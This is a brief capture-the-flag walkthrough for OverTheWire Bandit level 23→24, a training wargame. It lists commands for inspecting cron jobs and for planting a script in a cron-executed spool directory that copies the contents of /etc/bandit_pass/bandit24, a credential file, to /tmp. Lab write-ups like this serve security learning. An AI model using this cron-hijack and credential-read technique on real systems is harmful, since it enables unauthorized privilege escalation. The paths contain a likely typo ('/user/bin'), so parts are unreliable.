1-Level & Objective:

Level: Bandit23 → Bandit24

Objective: getting the password of the next level by exploiting cron jobs

Initial Information / Hints Username: bandit23

Password: ----------------

Host: bandit.labs.overthewire.org

Port: 2220

Step-by-Step Solution SSH into the server:

ssh bandit23@bandit.labs.overthewire.org -p 2220

enter the password from the previous game

use commands:
cd /etc/cron.d
ls -al
cat cronjob_bandit23
cat /user/bin/cronjob_bandit24.sh
cd /var/spool/bandit24/foo
nano script.sh >>> #!/bin/bash 
cat /etc/bandit_pass/bandit24 > /tmp/password
wait a minute ! (who are you haha)
cat /tmp/password
Boom !

Explanation and reasoning: N/A
